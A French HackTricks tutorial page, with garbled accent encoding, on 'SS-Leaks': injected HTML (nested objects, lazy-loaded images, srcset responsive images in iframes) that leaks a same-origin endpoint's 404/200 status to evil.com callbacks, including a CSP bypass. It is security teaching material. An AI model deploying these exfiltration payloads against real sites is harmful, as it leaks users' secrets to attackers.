# SS-Leaks

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Ceci est un **mix** entre **dangling markup et XS-Leaks**. D'un c√¥t√©, la vuln√©rabilit√© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **m√™me origine** que celle que nous attaquerons. De l'autre c√¥t√©, nous n'**attaquerons** pas directement la page o√π nous pouvons injecter du HTML, mais **une autre page**.

## Objets Imbriqu√©s

Si le point de terminaison <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> renvoie un code de statut 404, alors l'`object` interne est charg√©, donnant un callback √† <mark style="color:yellow;">`https://evil.com?callback=a`</mark> et nous informant que la requ√™te de recherche `a` n'a donn√© aucun r√©sultat.
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### Chargement paresseux

Et si CSP bloque les objets externes ? Essayons √† nouveau avec la CSP suivante :

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

Notre `object` de rappel ci-dessus ne fonctionne plus. √Ä sa place, nous pouvons utiliser le [chargement paresseux](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading) d'images ! L'image suivante ne se chargera que lorsqu'elle sera visible et √† une certaine distance du viewport.
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### Images R√©actives

La technique ci-dessus est excellente, mais elle d√©pend de notre injection HTML se trouvant dans le champ de vision de l'utilisateur.

Si l'injection est hors √©cran et que l'utilisateur ne fait pas d√©filer, pouvons-nous toujours exfiltrer des donn√©es ? Bien s√ªr, nous pouvons utiliser des identifiants d'√©l√©ments et [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) pour cr√©er une URL qui force le d√©filement, mais ceux-ci d√©pendent de l'interaction de l'utilisateur et ne nous permettent pas d'obtenir des exfiltrations coh√©rentes dans un sc√©nario r√©el. Id√©alement, nous voulons armer l'injection HTML stock√©e de mani√®re fiable.

Entrent en jeu les images r√©actives ! Sp√©cifiquement, les attributs `srcset` et `sizes` des images.

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

Il y a pas mal de choses √† d√©baller ici. Tout d'abord, souvenez-vous que le iframe interne ne sera visible que si le point de terminaison qui fuite retourne un code de statut 404.

C'est important car nous allons maintenant charger conditionnellement l'image √† l'int√©rieur du iframe √† partir de deux URLs diff√©rentes. En utilisant l'attribut `sizes`, nous pouvons utiliser des [requ√™tes m√©dia](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries) pour choisir quelle URL charger pour l'image, en fonction de la taille de la fen√™tre d'affichage.

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

√âtant donn√© que notre iframe a `width="1000px"`, ce qui suit se produit :

1. Si le point de terminaison leaky renvoie un code de statut 404, l'iframe est affich√© et a une largeur de 1000px. L'image √† l'int√©rieur de l'iframe correspond √† la requ√™te m√©dia `(min-width: 1000px)` et charge l'image de 800px depuis `https://evil.com?callback=0`.
2. Si le point de terminaison leaky renvoie un code de statut 200, l'iframe n'est _pas_ affich√©. Puisque l'image n'est pas rendue comme partie d'un grand iframe, elle correspond √† la requ√™te m√©dia `(max-width 999px)` et charge l'image de 480px depuis `https://evil.com?callback=1`.

## R√©f√©rences

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
